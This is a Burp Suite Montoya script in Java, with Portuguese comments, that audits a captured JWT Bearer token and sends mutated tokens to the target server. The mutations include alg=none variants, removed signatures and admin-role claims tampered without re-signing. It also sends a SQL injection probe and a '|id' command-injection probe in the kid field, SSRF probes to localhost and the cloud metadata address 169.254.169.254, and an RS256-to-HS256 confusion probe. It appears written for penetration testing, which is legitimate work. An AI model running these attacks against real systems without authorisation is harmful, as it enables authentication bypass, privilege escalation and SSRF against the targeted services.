// ================= JWT / BEARER TOKEN CHECKER =================
// Focus: Authorization: Bearer <JWT>
// - Decodes and audits JWT structure, claims, and header fields
// - Sends modified Bearer tokens to test signature verification, alg:none,
//   claim tampering, time claim enforcement, aud/iss handling, and header abuse
// - Logs only; does not send anything to Repeater

var jwtReq = requestResponse.request();
var jwtRes = requestResponse.response();

if (jwtRes == null) {
    logging.logToOutput("[!] No response available. Send the request first.");
    return;
}

String jwtToken = null;
String authHeaderValue = null;

for (var h : jwtReq.headers()) {
    if (h.name().equalsIgnoreCase("Authorization") && h.value().toLowerCase().startsWith("bearer ")) {
        authHeaderValue = h.value();
        jwtToken = h.value().substring(7).trim();
        break;
    }
}

if (jwtToken == null || jwtToken.isBlank()) {
    logging.logToOutput("[!] No Authorization: Bearer token found.");
    return;
}

var jwtParts = jwtToken.split("\\.", -1);
if (jwtParts.length < 2) {
    logging.logToOutput("[!] Bearer token is not in JWT compact format.");
    return;
}

String headerPart = jwtParts[0];
String payloadPart = jwtParts[1];
String signaturePart = jwtParts.length > 2 ? jwtParts[2] : "";

java.util.function.Function<String, byte[]> b64UrlDecode = (input) -> {
    try {
        String normalized = input.replace('-', '+').replace('_', '/');
        int padding = (4 - (normalized.length() % 4)) % 4;
        normalized = normalized + "=".repeat(padding);
        return java.util.Base64.getDecoder().decode(normalized);
    } catch (Exception e) {
        return null;
    }
};

java.util.function.Function<String, String> b64UrlDecodeToString = (input) -> {
    byte[] out = b64UrlDecode.apply(input);
    return out == null ? null : new String(out, java.nio.charset.StandardCharsets.UTF_8);
};

java.util.function.Function<String, String> b64UrlEncode = (input) ->
    java.util.Base64.getUrlEncoder().withoutPadding()
        .encodeToString(input.getBytes(java.nio.charset.StandardCharsets.UTF_8));

String decodedHeader = b64UrlDecodeToString.apply(headerPart);
String decodedPayload = b64UrlDecodeToString.apply(payloadPart);

if (decodedHeader == null || decodedPayload == null) {
    logging.logToOutput("[!] Unable to decode JWT header/payload.");
    return;
}

burp.api.montoya.utilities.json.JsonNode headerJson;
burp.api.montoya.utilities.json.JsonNode payloadJson;

try {
    headerJson = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    payloadJson = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedPayload);
} catch (Exception e) {
    logging.logToOutput("[!] Decoded JWT header/payload is not valid JSON.");
    return;
}

var jwtFindings = new java.util.ArrayList<String>();
var jwtPassed = new java.util.ArrayList<String>();
var jwtManual = new java.util.ArrayList<String>();

java.util.function.Function<String, String> getResHeader = (name) -> {
    for (var h : jwtRes.headers()) {
        if (h.name().equalsIgnoreCase(name)) return h.value();
    }
    return null;
};

java.util.function.Function<burp.api.montoya.utilities.json.JsonNode, String> jsonToCompact = (node) -> node.toJsonString();

java.util.function.Function<String, burp.api.montoya.utilities.json.JsonNode> parseJson = (text) -> {
    try {
        return burp.api.montoya.utilities.json.JsonNode.jsonNode(text);
    } catch (Exception e) {
        return null;
    }
};

java.util.function.BiFunction<String, String, String> replaceAuthHeader = (origHeaderValue, newToken) -> {
    return "Bearer " + newToken;
};

java.util.function.Function<String, Boolean> isLikelyJwt = (token) -> token.split("\\.", -1).length >= 2;

var verboseErrorPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)\\bstack ?trace\\b"),
    java.util.regex.Pattern.compile("(?i)Traceback \\(most recent call last\\)"),
    java.util.regex.Pattern.compile("(?i)Whitelabel Error Page"),
    java.util.regex.Pattern.compile("(?i)Fatal error:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Warning:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Notice:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Caused by:"),
    java.util.regex.Pattern.compile("(?i)UnhandledPromiseRejection"),
    java.util.regex.Pattern.compile("(?i)TypeError:.*"),
    java.util.regex.Pattern.compile("(?i)ReferenceError:.*"),
    java.util.regex.Pattern.compile("(?i)SyntaxError:.*"),
    java.util.regex.Pattern.compile("(?i)\\bjava\\.lang\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bSystem\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bJsonWebTokenError\\b"),
    java.util.regex.Pattern.compile("(?i)\\bJWT(::|\\s)?Decode"),
    java.util.regex.Pattern.compile("(?i)\\bjsonwebtoken\\b"),
    java.util.regex.Pattern.compile("(?i)\\bjjwt\\b"),
    java.util.regex.Pattern.compile("(?i)\\bjose\\b"),
    java.util.regex.Pattern.compile("(?i)\\borg\\.springframework\\.\\w+\\b")
);

java.util.function.Function<String, Boolean> hasVerboseError = (body) ->
    verboseErrorPatterns.stream().anyMatch(p -> p.matcher(body).find());

java.util.function.BiFunction<String, burp.api.montoya.utilities.json.JsonNode, String> buildToken = (headerStr, payloadNode) -> {
    String newHeaderB64 = b64UrlEncode.apply(headerStr);
    String newPayloadB64 = b64UrlEncode.apply(payloadNode.toJsonString());
    return newHeaderB64 + "." + newPayloadB64 + "." + signaturePart;
};

java.util.function.BiFunction<String, String, String> buildRawToken = (headerStr, payloadStr) -> {
    String newHeaderB64 = b64UrlEncode.apply(headerStr);
    String newPayloadB64 = b64UrlEncode.apply(payloadStr);
    return newHeaderB64 + "." + newPayloadB64 + "." + signaturePart;
};

java.util.function.BiFunction<String, String, burp.api.montoya.http.message.requests.HttpRequest> withBearerToken = (origAuth, newToken) -> {
    String newAuth = replaceAuthHeader.apply(origAuth, newToken);
    var updatedReq = jwtReq.withUpdatedHeader("Authorization", newAuth).withService(jwtReq.httpService());
    return updatedReq;
};

// ===== BASELINE ANALYSIS =====

String algValue = null;
String typValue = null;
boolean hasJwkHeader = false;
boolean hasJkuHeader = false;
boolean hasKidHeader = false;
boolean hasX5uHeader = false;
boolean hasX5cHeader = false;

if (headerJson.isObject()) {
    var hm = headerJson.asObject().asMap();
    if (hm.containsKey("alg")) algValue = hm.get("alg").value();
    if (hm.containsKey("typ")) typValue = hm.get("typ").value();
    hasJwkHeader = hm.containsKey("jwk");
    hasJkuHeader = hm.containsKey("jku");
    hasKidHeader = hm.containsKey("kid");
    hasX5uHeader = hm.containsKey("x5u");
    hasX5cHeader = hm.containsKey("x5c");
}

logging.logToOutput("========== JWT / BEARER CHECKER ==========");
logging.logToOutput("[*] JWT header: " + decodedHeader);
logging.logToOutput("[*] JWT payload: " + decodedPayload);
logging.logToOutput("[*] alg=" + algValue + " | typ=" + typValue + " | parts=" + jwtParts.length);

if (algValue == null) jwtFindings.add("[HIGH] JWT sem campo alg no header");
else jwtPassed.add("JWT possui campo alg: " + algValue);

if ("none".equalsIgnoreCase(algValue)) jwtFindings.add("[CRITICAL] JWT baseline usa alg=none");
if (algValue != null && (algValue.equalsIgnoreCase("HS256") || algValue.equalsIgnoreCase("HS384") || algValue.equalsIgnoreCase("HS512"))) {
    jwtManual.add("JWT usa HMAC (" + algValue + ") - avaliar brute-force de segredo fraco offline");
}
if (algValue != null && (algValue.equalsIgnoreCase("RS256") || algValue.equalsIgnoreCase("RS384") || algValue.equalsIgnoreCase("RS512"))) {
    jwtManual.add("JWT usa RSA (" + algValue + ") - testar confusion attack RS256->HS256 se houver chave publica exposta");
}
if (algValue != null && (algValue.equalsIgnoreCase("ES256") || algValue.equalsIgnoreCase("ES384") || algValue.equalsIgnoreCase("ES512"))) {
    jwtManual.add("JWT usa ECDSA (" + algValue + ") - validar biblioteca e implementacao; nonce reuse requer analise offline");
}

if (hasJwkHeader) jwtFindings.add("[HIGH] Header JWT contem jwk embutido - superficie para key injection");
if (hasJkuHeader) jwtFindings.add("[HIGH] Header JWT contem jku - superficie para JWKS spoofing / SSRF");
if (hasKidHeader) jwtManual.add("Header JWT contem kid - testar path traversal, SQLi ou command injection no resolvedor de chave");
if (hasX5uHeader) jwtFindings.add("[HIGH] Header JWT contem x5u - superficie para SSRF / trusted key abuse");
if (hasX5cHeader) jwtFindings.add("[HIGH] Header JWT contem x5c - avaliar certificate injection / trust abuse");

boolean hasExp = false;
boolean hasNbf = false;
boolean hasIat = false;
boolean hasAud = false;
boolean hasIss = false;
boolean hasJti = false;

if (payloadJson.isObject()) {
    var pm = payloadJson.asObject().asMap();
    hasExp = pm.containsKey("exp");
    hasNbf = pm.containsKey("nbf");
    hasIat = pm.containsKey("iat");
    hasAud = pm.containsKey("aud");
    hasIss = pm.containsKey("iss");
    hasJti = pm.containsKey("jti");

    if (!hasExp) jwtFindings.add("[HIGH] JWT sem exp claim");
    else jwtPassed.add("JWT possui exp claim");

    if (!hasIat) jwtFindings.add("[MEDIUM] JWT sem iat claim");
    else jwtPassed.add("JWT possui iat claim");

    if (!hasNbf) jwtManual.add("JWT sem nbf - verificar se a aplicacao exige janela temporal minima");
    if (!hasAud) jwtManual.add("JWT sem aud - verificar reutilizacao cross-service");
    if (!hasIss) jwtManual.add("JWT sem iss - verificar validacao de emissor");
    if (!hasJti) jwtManual.add("JWT sem jti - avaliar risco de replay / falta de revogacao");

    for (String key : pm.keySet()) {
        String lowered = key.toLowerCase();
        String valuePreview = pm.get(key).toJsonString();

        if (lowered.contains("password") || lowered.contains("secret") || lowered.contains("apikey") ||
            lowered.contains("api_key") || lowered.contains("token") || lowered.contains("hash")) {
            jwtFindings.add("[HIGH] Possivel dado sensivel em claim JWT: " + key + "=" + valuePreview);
        }

        if (lowered.equals("role") || lowered.equals("roles") || lowered.equals("scope") || lowered.equals("scp") ||
            lowered.equals("permissions") || lowered.equals("perm") || lowered.equals("isadmin") ||
            lowered.equals("admin") || lowered.equals("tenant") || lowered.equals("tenant_id")) {
            jwtManual.add("Claim privilegiada encontrada: " + key + " - candidato para privilege escalation");
        }
    }
}

boolean jwtOverHttp = jwtReq.url().startsWith("http://");
if (jwtOverHttp) jwtFindings.add("[CRITICAL] Bearer token trafegando por HTTP");
else jwtPassed.add("Bearer token trafega por HTTPS");

String hsts = getResHeader.apply("Strict-Transport-Security");
if (hsts == null) jwtManual.add("Resposta sem HSTS - relevante para protecao de tokens em transporte");

// ===== HELPER FOR DYNAMIC TESTS =====

java.util.function.BiConsumer<String, String> testToken = (label, tokenToSend) -> {
    try {
        var mutatedReq = withBearerToken.apply(authHeaderValue, tokenToSend);
        if (mutatedReq.httpService() == null) {
            logging.logToOutput("[!] No HttpService for test: " + label);
            return;
        }

        var result = api.http().sendRequest(mutatedReq);
        if (result.response() == null) {
            logging.logToOutput("NONE [JWT] " + label + " | sem resposta");
            return;
        }

        int st = result.response().statusCode();
        String body = result.response().bodyToString();
        boolean verbose = hasVerboseError.apply(body);

        if (st < 400 && !body.toLowerCase().contains("invalid token") && !body.toLowerCase().contains("jwt malformed")
                && !body.toLowerCase().contains("signature") && !body.toLowerCase().contains("unauthorized")
                && !body.toLowerCase().contains("forbidden") && !body.toLowerCase().contains("expired")) {
            logging.logToOutput(st + " [HIT] JWT " + label);
        } else if (verbose) {
            logging.logToOutput(st + " [DEBUG] JWT " + label + " | verbose error exposed");
        } else {
            logging.logToOutput(st + " [OK] JWT " + label);
        }
    } catch (Exception e) {
        logging.logToOutput("[!] Exception during JWT test " + label + ": " + e.getMessage());
    }
};

// ===== DYNAMIC TESTS =====

// 1) Signature not verified / claim tampering without resigning
if (payloadJson.isObject()) {
    var p1 = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    var p1m = p1.asObject();

    if (p1m.asMap().containsKey("admin")) {
        p1m.putBoolean("admin", true);
        testToken.accept("tamper-admin-without-resign", buildToken.apply(decodedHeader, p1));
    }
    if (p1m.asMap().containsKey("isAdmin")) {
        p1m.putBoolean("isAdmin", true);
        testToken.accept("tamper-isAdmin-without-resign", buildToken.apply(decodedHeader, p1));
    }
    if (p1m.asMap().containsKey("role")) {
        p1m.putString("role", "admin");
        testToken.accept("tamper-role-admin-without-resign", buildToken.apply(decodedHeader, p1));
    }
    if (p1m.asMap().containsKey("scope")) {
        p1m.putString("scope", "admin superuser root *");
        testToken.accept("tamper-scope-without-resign", buildToken.apply(decodedHeader, p1));
    }
    if (p1m.asMap().containsKey("permissions")) {
        p1m.putString("permissions", "[\"*\"]");
        testToken.accept("tamper-permissions-without-resign", buildToken.apply(decodedHeader, p1));
    }

    // generic privilege escalation seed if none of the above exists
    if (!p1m.asMap().containsKey("role") && !p1m.asMap().containsKey("admin") && !p1m.asMap().containsKey("isAdmin")) {
        p1m.putString("role", "admin");
        testToken.accept("inject-role-admin-without-resign", buildToken.apply(decodedHeader, p1));
    }
}

// 2) alg=none
if (headerJson.isObject()) {
    var hNone = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hNone.asObject().putString("alg", "none");

    String noneHeader = hNone.toJsonString();
    String nonePayload = payloadJson.toJsonString();
    String noneToken = b64UrlEncode.apply(noneHeader) + "." + b64UrlEncode.apply(nonePayload) + ".";
    testToken.accept("alg-none-empty-signature", noneToken);

    String[] noneVariants = new String[]{"None", "NONE", "NoNe"};
    for (String variant : noneVariants) {
        var hv = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
        hv.asObject().putString("alg", variant);
        String tok = b64UrlEncode.apply(hv.toJsonString()) + "." + b64UrlEncode.apply(nonePayload) + ".";
        testToken.accept("alg-" + variant + "-empty-signature", tok);
    }
}

// 3) Remove signature entirely
String noSigToken = headerPart + "." + payloadPart + ".";
testToken.accept("remove-signature-keep-original-header-payload", noSigToken);

// 4) Empty / junk signature
String junkSigToken = headerPart + "." + payloadPart + ".AAAA";
testToken.accept("junk-signature", junkSigToken);

// 5) Time claim checks
if (payloadJson.isObject()) {
    long now = java.time.Instant.now().getEpochSecond();

    if (hasExp) {
        var pExpPast = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        pExpPast.asObject().putNumber("exp", now - 86400);
        testToken.accept("expired-exp-claim-without-resign", buildToken.apply(decodedHeader, pExpPast));

        var pExpFar = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        pExpFar.asObject().putNumber("exp", now + 315360000L);
        testToken.accept("excessive-exp-10-years-without-resign", buildToken.apply(decodedHeader, pExpFar));
    } else {
        var pNoExp = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
        testToken.accept("missing-exp-claim-current-token-shape", buildToken.apply(decodedHeader, pNoExp));
    }

    var pNbfFuture = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pNbfFuture.asObject().putNumber("nbf", now + 86400);
    testToken.accept("future-nbf-without-resign", buildToken.apply(decodedHeader, pNbfFuture));

    var pIatFuture = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pIatFuture.asObject().putNumber("iat", now + 86400);
    testToken.accept("future-iat-without-resign", buildToken.apply(decodedHeader, pIatFuture));
}

// 6) Audience / issuer / jti / replay-oriented manipulations
if (payloadJson.isObject()) {
    var pAud = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pAud.asObject().putString("aud", "unexpected-service");
    testToken.accept("tamper-aud-without-resign", buildToken.apply(decodedHeader, pAud));

    var pIss = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pIss.asObject().putString("iss", "https://attacker.invalid/");
    testToken.accept("tamper-iss-without-resign", buildToken.apply(decodedHeader, pIss));

    var pJti = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
    pJti.asObject().putString("jti", "replay-test-fixed-jti");
    testToken.accept("tamper-jti-fixed-value-without-resign", buildToken.apply(decodedHeader, pJti));
}

// 7) Header abuse: kid / jku / jwk / x5u / x5c
if (headerJson.isObject()) {
    var hKidTrav = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hKidTrav.asObject().putString("kid", "../../../../../../dev/null");
    testToken.accept("kid-path-traversal", buildRawToken.apply(hKidTrav.toJsonString(), payloadJson.toJsonString()));

    var hKidSql = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hKidSql.asObject().putString("kid", "' OR '1'='1");
    testToken.accept("kid-sqli-probe", buildRawToken.apply(hKidSql.toJsonString(), payloadJson.toJsonString()));

    var hKidCmd = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hKidCmd.asObject().putString("kid", "|id");
    testToken.accept("kid-command-injection-probe", buildRawToken.apply(hKidCmd.toJsonString(), payloadJson.toJsonString()));

    var hJku = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hJku.asObject().putString("jku", "http://127.0.0.1:80/jwks.json");
    testToken.accept("jku-ssrf-probe-localhost", buildRawToken.apply(hJku.toJsonString(), payloadJson.toJsonString()));

    var hX5u = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hX5u.asObject().putString("x5u", "http://169.254.169.254/latest/meta-data/");
    testToken.accept("x5u-ssrf-probe-imds", buildRawToken.apply(hX5u.toJsonString(), payloadJson.toJsonString()));

    var hJwk = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hJwk.asObject().putString("jwk", "{\"kty\":\"RSA\",\"e\":\"AQAB\",\"n\":\"attacker\"}");
    testToken.accept("embedded-jwk-header-probe", buildRawToken.apply(hJwk.toJsonString(), payloadJson.toJsonString()));

    var hX5c = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hX5c.asObject().putString("x5c", "[\"MIIBfakeattackercert\"]");
    testToken.accept("x5c-certificate-injection-probe", buildRawToken.apply(hX5c.toJsonString(), payloadJson.toJsonString()));
}

// 8) RS256 -> HS256 confusion probe shape only (unsigned/tampered form)
// Note: full cryptographic signing with public key as HMAC secret requires the public key.
// This sends a tampered structural probe and flags for manual follow-up.
if (algValue != null && algValue.equalsIgnoreCase("RS256")) {
    var hConf = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
    hConf.asObject().putString("alg", "HS256");
    testToken.accept("rs256-to-hs256-confusion-structural-probe", buildRawToken.apply(hConf.toJsonString(), payloadJson.toJsonString()));
    jwtManual.add("Para confusion attack completa RS256->HS256, obter chave publica/JWKS e assinar HS256 com ela como segredo");
}

// ===== FINAL REPORT =====

logging.logToOutput("--- JWT FINDINGS (" + jwtFindings.size() + ") ---");
for (String f : jwtFindings) logging.logToOutput(f);

logging.logToOutput("--- JWT PASSED (" + jwtPassed.size() + ") ---");
for (String p : jwtPassed) logging.logToOutput("[OK] " + p);

logging.logToOutput("--- JWT MANUAL REVIEW (" + jwtManual.size() + ") ---");
for (String m : jwtManual) logging.logToOutput("[MANUAL] " + m);

logging.logToOutput("========== END JWT CHECKER ==========");
